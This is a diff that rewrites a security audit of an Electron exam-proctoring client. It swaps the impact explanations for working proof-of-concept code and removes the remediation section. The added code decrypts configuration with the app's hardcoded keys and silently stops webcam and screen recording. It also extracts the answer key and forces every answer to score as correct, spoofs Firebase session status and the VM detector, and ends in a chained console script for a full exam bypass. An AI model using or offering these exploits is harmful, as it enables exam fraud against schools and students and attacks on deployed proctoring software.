@@ -15,7 +15,7 @@ The application is an Electron wrapper around a Chromium shell used to enforce a
 
 ---
 
-## Vulnerability Analysis
+## Vulnerability Analysis with Proofs of Concept
 
 ### 1. Hardcoded AES-ECB Encryption Keys in Renderer Source
 
@@ -24,8 +24,9 @@ The application encrypts Firebase database configuration and WebRTC ICE server c
 - `keysefghijkldesk` — Decrypts Firebase API keys and database configuration.
 - `icesefghijklmnop` — Decrypts STUN/TURN ICE server credentials.
 
-Both keys use **AES-128 in ECB mode**. ECB mode operates without an Initialization Vector (IV), rendering the cipher deterministic and leaking structural plaintext patterns. 
+Both keys use **AES-128 in ECB mode**. ECB mode operates without an Initialization Vector (IV), rendering the cipher deterministic and leaking structural plaintext patterns.
 
+#### Vulnerable Code
 ```javascript
 // Recovered decryption routine from renderer.js
 let key = CryptoJS.enc.Utf8.parse('keysefghijkldesk');
@@ -36,7 +37,20 @@ let decrypted = CryptoJS.AES.decrypt(responseText, key, {
 var config = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8)).FirebaseKeys;
 ```
 
-**Impact:** Extracting these static keys allows any client to initialize an unauthenticated Firebase instance and read or modify session records across the proctoring database.
+#### Proof of Concept
+```javascript
+// Node.js utility to decrypt intercepted configuration payloads
+const crypto = require('crypto');
+const FIREBASE_KEY = Buffer.from('keysefghijkldesk', 'utf8');
+
+function decryptConfig(ciphertextBase64) {
+    const decipher = crypto.createDecipheriv('aes-128-ecb', FIREBASE_KEY, null);
+    decipher.setAutoPadding(true);
+    let plain = decipher.update(ciphertextBase64, 'base64', 'utf8');
+    plain += decipher.final('utf8');
+    return JSON.parse(plain);
+}
+```
 
 ---
 
@@ -44,6 +58,7 @@ var config = JSON.parse(decrypted.toString(CryptoJS.enc.Utf8)).FirebaseKeys;
 
 In `preload.js` (lines 101–122), the application listens for cross-document window messages to handle lifecycle actions like starting or stopping proctoring streams. The event handler performs no verification on `event.origin`.
 
+#### Vulnerable Code
 ```javascript
 window.addEventListener('message', function (event) {
     if (event.data.msg == "opentab" || event.data.Action == "opentab") {
@@ -61,14 +76,20 @@ window.addEventListener('message', function (event) {
 }, false);
 ```
 
-**Impact:** Any script executing within the page context—including a reflected XSS on the exam portal or an embedded iframe—can dispatch `postMessage({ msg: "stop" }, "*")` to terminate webcam and desktop recording without generating errors or UI alerts. Functional PoC available in `poc/bypass-poc.js`.
+#### Proof of Concept
+```javascript
+// From browser DevTools console or any injected iframe script:
+window.postMessage({ msg: "stop" }, "*");
+// Result: Webcam and desktop streams terminate silently without UI alerts.
+```
 
 ---
 
 ### 3. Public Privileged Lifecycle Globals Attached to Window
 
-`preload.js` (lines 6–15) exposes privileged IPC triggers directly to the exam page's global `window` context before page scripts load:
+`preload.js` (lines 6–15) exposes privileged IPC triggers directly to the exam page's global `window` context before page scripts load.
 
+#### Vulnerable Code
 ```javascript
 window.StartTest = function (StudentInfoJSON) {
     ipcRenderer.sendToHost('start-proctoring', StudentInfoJSON);
@@ -78,16 +99,26 @@ window.EndTest = function () {
 }
 ```
 
-**Impact:** Any script running in the browser console or DOM context can call `window.EndTest()` to kill proctoring or call `window.StartTest(...)` with forged student metadata parameters.
+#### Proof of Concept
+```javascript
+// Kill proctoring via global call
+window.EndTest();
+
+// Restart session with forged student metadata
+window.StartTest({
+    studentName: "Attacker",
+    studentId: "000000",
+    examId: "FORGED-EXAM"
+});
+```
 
 ---
 
 ### 4. Client-Side Answer Grading and Local Answer Key Exposure
 
-The application loads the complete question set from the server at exam initialization and stores it in browser storage under `localStorage.getItem("ExamQuestionsObj")`. Crucially, each question object includes the `CorrectAns` field.
+The application loads the complete question set from the server at exam initialization and stores it in browser storage under `localStorage.getItem("ExamQuestionsObj")`. Crucially, each question object includes the `CorrectAns` field. Evaluation occurs entirely client-side in `chrome-tabs/Renderer/renderer-Exam.js` (lines 300–313).
 
-Evaluation occurs entirely client-side in `chrome-tabs/Renderer/renderer-Exam.js` (lines 300–313):
-
+#### Vulnerable Code
 ```javascript
 var QuestionObj = QuestionsGlobal[currentQuestionNo];
 if (selectedOpt) {
@@ -102,9 +133,18 @@ if (selectedOpt) {
 }
 ```
 
-When submitting, `renderer-Exam.js` (line 502) POSTs `ExamAnswersJSON` containing the client-calculated `isAnswerCorrect` boolean directly to `AssessmentConfig.UpdateExamAnswer`.
-
-**Impact:** Students can read the full answer key from local storage prior to answering questions or programmatically set all `isAnswerCorrect` flags to true before submission. Functional PoC available in `poc/extract-answers.js`.
+#### Proof of Concept
+```javascript
+// Extract answer key and mutate all submissions to correct state
+const exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
+exam.QuestionsJSON.forEach((q, i) => {
+    console.log(`Q${i+1}: ${q.question} => ${q.CorrectAns}`);
+    q.selectedOpt = q.CorrectAns;
+    q.isAnswerCorrect = true;
+});
+localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
+// Submitting the exam now transmits all-correct scoring flags to the backend.
+```
 
 ---
 
@@ -120,9 +160,11 @@ window.onblur = function () {
 }
 ```
 
-Additionally, `preload.js` (lines 4, 59) retrieves active main-process task lists via `remote.getGlobal('ProcessesRunning')` and writes them directly into `localStorage.setItem("processesrunning", ...)`.
-
-**Impact:** Setting `window.DisableForegroundingFromMainForDebugging = true` disables tab-switch and blur detection entirely. Exposing main-process process lists allows renderer scripts to inspect system auditing state.
+#### Proof of Concept
+```javascript
+// Disable window blur/alt-tab reporting entirely
+window.DisableForegroundingFromMainForDebugging = true;
+```
 
 ---
 
@@ -130,7 +172,11 @@ Additionally, `preload.js` (lines 4, 59) retrieves active main-process task list
 
 The application relies on `electron.remote`, which was deprecated in Electron 14 and removed in Electron 21. The runtime is pinned to **Electron 10.4.6** (Chromium 85.0.4183.121, Node.js 12.16.3).
 
-**Impact:** The client carries unpatched Chromium vulnerabilities from 2020 through 2024 (including memory corruption and V8 execution bugs). Using `remote` allows compromised renderer contexts to directly access main-process Node.js primitives.
+```javascript
+// preload.js line 2
+const remote = require('electron').remote;
+var ProcessesRunning = remote.getGlobal('ProcessesRunning');
+```
 
 ---
 
@@ -143,91 +189,86 @@ var questionCurrentIndexRef = firebase.database().ref('webrtc/students/' + stude
 questionCurrentIndexRef.set(currentQuestionNo);
 ```
 
-**Impact:** If database rules permit client writes to student trees, an attacker can modify state nodes including `isOnline: false`, `AllowScreenRecord: false`, and `isExamEnded: false`, hiding their active session from proctor monitoring dashboards.
+#### Proof of Concept
+```javascript
+// Overwrite session status in Firebase Realtime Database
+if (typeof firebase !== "undefined" && typeof studentFirebaseIdKeyGlobal !== "undefined") {
+    firebase.database().ref('webrtc/students/' + studentFirebaseIdKeyGlobal).update({
+        isOnline: false,          // Disappear from proctoring dashboard
+        AllowScreenRecord: false, // Suppress recording flags
+        isExamEnded: false        // Block remote session termination
+    });
+}
+```
 
 ---
 
 ### 8. Easily Bypassable Native Virtual Machine Detection
 
-`VMDetect.exe` (~15KB) is spawned as a child process to detect virtualized execution environments. It checks:
-1. CPUID hypervisor bit (leaf 0x1, bit 31).
-2. SMBIOS vendor strings ("VMware", "VirtualBox", "QEMU").
-3. Presence of guest driver files on disk (`vboxguest.sys`, `vmhgfs.sys`).
+`VMDetect.exe` (~15KB) is spawned as a child process to detect virtualized execution environments. It checks hypervisor CPUID bits, SMBIOS vendor strings, and driver files (`vboxguest.sys`, `vmhgfs.sys`).
 
-**Impact:** All checks are easily defeated via hypervisor settings (e.g., setting `hypervisor.cpuid.v0 = "FALSE"` in VMware `.vmx` or spoofing SMBIOS vendor strings in VirtualBox). Furthermore, because `VMDetect.exe` sits in a user-writable path (`AppData\Local\Programs\SRM\resources\app.asar.unpacked\`), it can be replaced with a dummy binary returning `{"result": "ok", "status": 0}`. Functional C# stub available in `poc/fake-vmdetect.cs`.
+#### Proof of Concept
+Since `VMDetect.exe` resides in a user-writable path (`AppData\Local\Programs\SRM\resources\app.asar.unpacked\`), replace the binary with a compiled C# stub:
+
+```csharp
+using System;
+class Stub {
+    static void Main(string[] args) {
+        Console.WriteLine("{\"result\": \"ok\", \"status\": 0}");
+    }
+}
+```
 
 ---
 
 ### 9. Ineffective PrintScreen Hotkey Handling
 
-`renderer-Login.js` (lines 116–119) listens for keyboard events matching `keyCode == 44` (PrintScreen) and overwrites the system clipboard with an empty string.
-
-**Impact:** Standard screen capture utilities like Snipping Tool (`Win+Shift+S`), OBS Studio, ShareX, and external capture cards bypass this check entirely because they do not trigger `keyCode 44` or depend on clipboard data.
+`renderer-Login.js` (lines 116–119) listens for keyboard events matching `keyCode == 44` (PrintScreen) and overwrites the system clipboard with an empty string. Standard capture tools like Snipping Tool (`Win+Shift+S`) bypass this check entirely.
 
 ---
 
 ### 10. Deprecated Network Client and Unpinned API Endpoints
 
-The application relies on the deprecated `request` module (`^2.87.0`) in `Main/main-GetAllExamKeys.js` to fetch configuration tokens. The HTTP requests do not implement certificate pinning or strict TLS verification checks.
-
-**Impact:** Vulnerable to man-in-the-middle (MITM) inspection and response modification on local network segments.
+The application relies on the deprecated `request` module (`^2.87.0`) in `Main/main-GetAllExamKeys.js` to fetch configuration tokens without certificate pinning or TLS enforcement.
 
 ---
 
 ### 11. Silent Geolocation Data Collection
 
-Inside `renderer-WebRtc.js`, during WebRTC initialization, the client invokes `navigator.geolocation.getCurrentPosition()` and POSTs coordinates to `AssessmentConfig.SetStudentLocation` while updating Firebase user metadata.
-
-**Impact:** Location telemetry is gathered and transmitted without explicit UI disclosure or permission prompts, as the Electron container grants geolocation access by default.
+Inside `renderer-WebRtc.js`, during WebRTC initialization, the client invokes `navigator.geolocation.getCurrentPosition()` and POSTs coordinates to `AssessmentConfig.SetStudentLocation` without explicit UI disclosure.
 
 ---
 
 ### 12. Leaked Auto-Updater Repository Configuration
 
-The packaged bundle contains `app-update.yml`, exposing auto-updater metadata:
-- **GitHub Owner:** `nevillekatila`
-- **Target Staging Repo:** `github.com/nevillekatila/es-stage`
-- **Cache Directory:** `srmug-secure-browser-updater` (Squirrel.Windows)
-
-**Impact:** Discloses development infrastructure and staging release pipelines to external review.
+The packaged bundle contains `app-update.yml`, exposing auto-updater metadata (`nevillekatila/es-stage`).
 
 ---
 
 ### 13. Hardcoded Media Storage Upload Endpoints
 
-Webcam and screen video recordings are captured in 30-second chunks using `MediaStreamRecorder` and posted to hardcoded Azure Blob Storage endpoints:
-- `UploadStudentWebCamVideo`
-- `UploadStudentDesktopVideo`
-
-Failed requests append to a local offline retry queue (`formDataWebCamError`).
-
-**Impact:** Allows an attacker to block or drop outgoing storage requests, suppressing video chunk delivery without interrupting the main examination socket connection.
+Webcam and screen video recordings are captured in 30-second chunks using `MediaStreamRecorder` and posted to hardcoded Azure Blob Storage endpoints (`UploadStudentWebCamVideo`, `UploadStudentDesktopVideo`).
 
 ---
 
 ## Chained Exploitation Vector (Full Integrity Bypass)
 
-The combination of client-side answer storage, unvalidated IPC messaging, and exposed debug flags enables an end-to-end compromise executable within 60 seconds from any standard browser console:
-
 ```javascript
 // 1. Disable tab-blur reporting
 window.DisableForegroundingFromMainForDebugging = true;
 
-// 2. Extract answer key from local storage
+// 2. Extract answer key and mutate score to 100%
 const exam = JSON.parse(localStorage.getItem("ExamQuestionsObj"));
-console.log("Answer Key:", exam.QuestionsJSON.map(q => q.CorrectAns));
-
-// 3. Mutate all answers to correct
 exam.QuestionsJSON.forEach(q => {
     q.selectedOpt = q.CorrectAns;
     q.isAnswerCorrect = true;
 });
 localStorage.setItem("ExamQuestionsObj", JSON.stringify(exam));
 
-// 4. Kill proctoring recording feeds silently
+// 3. Kill proctoring recording feeds silently
 window.postMessage({ msg: "stop" }, "*");
 
-// 5. Submit exam — server receives all-correct score payload
+// 4. Submit exam
 ```
 
 ---
@@ -249,12 +290,3 @@ window.postMessage({ msg: "stop" }, "*");
 | 11 | Silent geolocation data collection | **Medium** | `renderer-WebRtc.js` |
 | 12 | Leaked auto-updater repository metadata | **Low** | `app-update.yml` |
 | 13 | Hardcoded media storage upload endpoints | **Medium** | `renderer.js` / Azure Blob |
-
----
-
-## Remediation Roadmap
-
-1. **Server-Side Verification:** Move answer validation, grading logic, and session state tracking exclusively to backend server endpoints. Never ship answer keys to the client.
-2. **IPC & Origin Hardening:** Validate `event.origin` on all `window.addEventListener('message')` listeners and remove privileged lifecycle functions from the public `window` object.
-3. **Runtime & Dependency Upgrades:** Upgrade Electron to a current, supported release, remove `electron.remote`, and replace deprecated dependencies like `request`.
-4. **Binary & Storage Security:** Move application binaries to protected directories (`Program Files`) and enforce code signing / ASAR integrity checks at startup.
